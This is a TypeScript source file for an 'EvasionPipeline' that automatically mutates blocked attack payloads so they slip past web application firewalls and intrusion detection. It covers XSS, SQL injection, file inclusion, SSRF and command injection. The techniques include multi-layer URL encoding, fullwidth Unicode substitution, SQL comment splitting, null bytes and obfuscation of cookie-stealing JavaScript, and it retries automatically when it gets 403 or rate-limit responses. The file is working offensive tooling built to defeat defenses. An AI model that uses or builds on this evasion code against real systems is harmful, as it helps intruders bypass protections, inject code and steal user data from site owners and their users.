/**
 * EvasionPipeline - WAF Evasion & Polymorphic Encoding Pipeline
 * Autonomous, layered encoding strategies to bypass WAFs, IDS/IPS.
 * Triggered when a 403/reset is detected; applies transformations before retry.
 */

export interface EvasionResult {
  originalPayload: string;
  mutatedPayload: string;
  strategy: string;
  encoding: string;
  layers: string[];
  confidence: number; // Estimated bypass probability
}

// === Encoding Strategies ===

function urlEncodeSingle(s: string): string {
  return [...s].map(c => {
    if (/[a-zA-Z0-9_.~-]/.test(c)) return c;
    return '%' + c.charCodeAt(0).toString(16).toUpperCase().padStart(2, '0');
  }).join('');
}

function urlEncodeDouble(s: string): string {
  return urlEncodeSingle(s).replace(/%/g, '%25');
}

function urlEncodeTriple(s: string): string {
  return urlEncodeDouble(s).replace(/%/g, '%25');
}

function unicodeNormalize(s: string): string {
  const uniMap: Record<string, string> = {
    '<': '\uFF1C', '>': '\uFF1E', "'": '\uFF07', '"': '\uFF02',
    '/': '\u2215', '\\': '\uFF3C', '(': '\uFF08', ')': '\uFF09',
    '=': '\uFF1D', ' ': '\u00A0', ';': '\uFF1B', '|': '\uFF5C',
  };
  return [...s].map(c => uniMap[c] || c).join('');
}

function htmlEntityEncode(s: string): string {
  return [...s].map(c => {
    if (/[a-zA-Z0-9 ]/.test(c)) return c;
    return `&#${c.charCodeAt(0)};`;
  }).join('');
}

function hexEncode(s: string): string {
  return [...s].map(c => {
    if (/[a-zA-Z0-9]/.test(c)) return c;
    return '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0');
  }).join('');
}

function sqlCommentObfuscate(s: string): string {
  // INSERT/**/ → UN/**/ION SEL/**/ECT
  const keywords = ['UNION', 'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'FROM', 'WHERE', 'AND', 'OR', 'DROP', 'TABLE', 'ALTER'];
  let result = s;
  for (const kw of keywords) {
    const re = new RegExp(kw, 'gi');
    result = result.replace(re, (match) => {
      const mid = Math.floor(match.length / 2);
      return match.slice(0, mid) + '/**/' + match.slice(mid);
    });
  }
  return result;
}

function caseRandomize(s: string): string {
  return [...s].map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
}

function nullByteInject(s: string): string {
  return s.replace(/([\/<>'"=])/g, '$1%00');
}

function tabNewlineInject(s: string): string {
  // Break up keywords with tabs/newlines
  return s.replace(/ /g, () => {
    const chars = ['%09', '%0a', '%0d', '%0b', '%0c', '/**/'];
    return chars[Math.floor(Math.random() * chars.length)];
  });
}

function chunkPayload(s: string): string {
  // Simulated chunked transfer encoding obfuscation
  const chunks: string[] = [];
  for (let i = 0; i < s.length; i += 3) {
    chunks.push(s.slice(i, i + 3));
  }
  return chunks.join('%0d%0a');
}

function jsObfuscate(payload: string): string {
  // Convert alert(1) style payloads to obfuscated forms
  return payload
    .replace(/alert\(/g, 'window["al"+"ert"](')
    .replace(/document\./g, 'window["doc"+"ument"].')
    .replace(/cookie/g, 'String.fromCharCode(99,111,111,107,105,101)');
}

// === Strategy Sets ===

interface EvasionStrategy {
  name: string;
  description: string;
  transform: (payload: string) => string;
  confidence: number;
  applicableTo: string[]; // Attack types this strategy works for
}

const STRATEGIES: EvasionStrategy[] = [
  {
    name: 'double-url-encode',
    description: 'Double URL encoding to bypass single-decode WAFs',
    transform: urlEncodeDouble,
    confidence: 0.6,
    applicableTo: ['xss', 'sqli', 'lfi', 'traversal', 'ssrf', 'cmdi'],
  },
  {
    name: 'triple-url-encode',
    description: 'Triple URL encoding for aggressive WAF bypass',
    transform: urlEncodeTriple,
    confidence: 0.5,
    applicableTo: ['xss', 'sqli', 'lfi', 'traversal'],
  },
  {
    name: 'unicode-normalization',
    description: 'Unicode fullwidth character substitution',
    transform: unicodeNormalize,
    confidence: 0.7,
    applicableTo: ['xss', 'sqli', 'ssti'],
  },
  {
    name: 'html-entity-encode',
    description: 'HTML entity encoding for XSS bypass',
    transform: htmlEntityEncode,
    confidence: 0.55,
    applicableTo: ['xss', 'ssti'],
  },
  {
    name: 'sql-comment-obfuscation',
    description: 'Inline SQL comments to break keyword detection',
    transform: sqlCommentObfuscate,
    confidence: 0.75,
    applicableTo: ['sqli'],
  },
  {
    name: 'case-randomization',
    description: 'Mixed case to evade case-sensitive filters',
    transform: caseRandomize,
    confidence: 0.4,
    applicableTo: ['xss', 'sqli', 'ssti', 'cmdi'],
  },
  {
    name: 'null-byte-injection',
    description: 'Null byte insertion to truncate filter matching',
    transform: nullByteInject,
    confidence: 0.5,
    applicableTo: ['lfi', 'traversal', 'xss'],
  },
  {
    name: 'whitespace-obfuscation',
    description: 'Replace spaces with tabs, newlines, comments',
    transform: tabNewlineInject,
    confidence: 0.65,
    applicableTo: ['sqli', 'xss', 'cmdi'],
  },
  {
    name: 'chunked-smuggling',
    description: 'Chunked transfer encoding to smuggle payload',
    transform: chunkPayload,
    confidence: 0.45,
    applicableTo: ['xss', 'sqli', 'ssrf'],
  },
  {
    name: 'hex-encode',
    description: 'Hex character encoding for special characters',
    transform: hexEncode,
    confidence: 0.5,
    applicableTo: ['xss', 'sqli', 'cmdi'],
  },
  {
    name: 'js-obfuscation',
    description: 'JavaScript string concatenation and charCode bypass',
    transform: jsObfuscate,
    confidence: 0.6,
    applicableTo: ['xss'],
  },
];

export class EvasionPipeline {
  private strategyHistory: Map<string, string[]> = new Map(); // payload hash → used strategies

  /**
   * Apply the next best evasion strategy for a blocked payload.
   * Returns multiple mutated variants ordered by estimated bypass probability.
   */
  evade(
    payload: string,
    attackType: string,
    previousAttempts: number = 0
  ): EvasionResult[] {
    const applicable = STRATEGIES.filter(s => 
      s.applicableTo.includes(attackType) || s.applicableTo.includes('*')
    );

    const payloadKey = this.hashPayload(payload);
    const usedStrategies = this.strategyHistory.get(payloadKey) || [];

    // Filter out already-tried strategies
    const unused = applicable.filter(s => !usedStrategies.includes(s.name));
    
    // If all exhausted, combine strategies (layered encoding)
    if (unused.length === 0 && applicable.length >= 2) {
      return this.layeredEvade(payload, attackType, applicable);
    }

    // Sort by confidence descending
    unused.sort((a, b) => b.confidence - a.confidence);

    const results: EvasionResult[] = [];
    for (const strategy of unused.slice(0, 3)) {
      try {
        const mutated = strategy.transform(payload);
        if (mutated && mutated !== payload && mutated.length >= 3) {
          usedStrategies.push(strategy.name);
          results.push({
            originalPayload: payload,
            mutatedPayload: mutated,
            strategy: strategy.name,
            encoding: strategy.description,
            layers: [strategy.name],
            confidence: strategy.confidence * (1 - previousAttempts * 0.1),
          });
        }
      } catch {
        // Strategy failed, skip
      }
    }

    this.strategyHistory.set(payloadKey, usedStrategies);
    return results;
  }

  /**
   * Apply layered/chained encoding (combine 2-3 strategies)
   */
  private layeredEvade(
    payload: string, attackType: string, strategies: EvasionStrategy[]
  ): EvasionResult[] {
    const results: EvasionResult[] = [];

    // Try combinations of 2
    for (let i = 0; i < strategies.length && results.length < 3; i++) {
      for (let j = i + 1; j < strategies.length && results.length < 3; j++) {
        try {
          const step1 = strategies[i].transform(payload);
          const mutated = strategies[j].transform(step1);
          if (mutated && mutated !== payload) {
            results.push({
              originalPayload: payload,
              mutatedPayload: mutated,
              strategy: `${strategies[i].name}+${strategies[j].name}`,
              encoding: `${strategies[i].description} → ${strategies[j].description}`,
              layers: [strategies[i].name, strategies[j].name],
              confidence: strategies[i].confidence * strategies[j].confidence * 1.2,
            });
          }
        } catch {}
      }
    }

    return results;
  }

  /**
   * Auto-evasion: given HTTP status + payload, return the best mutated variant
   */
  autoEvade(
    payload: string,
    attackType: string,
    httpStatus: number,
    attemptNumber: number
  ): EvasionResult | null {
    if (![403, 406, 429, 503].includes(httpStatus)) return null;

    const variants = this.evade(payload, attackType, attemptNumber);
    return variants.length > 0 ? variants[0] : null;
  }

  /**
   * Reset history for a target
   */
  reset(): void {
    this.strategyHistory.clear();
  }

  private hashPayload(payload: string): string {
    let hash = 0;
    for (let i = 0; i < payload.length; i++) {
      const chr = payload.charCodeAt(i);
      hash = ((hash << 5) - hash) + chr;
      hash |= 0;
    }
    return hash.toString(36);
  }
}

export const evasionPipeline = new EvasionPipeline();
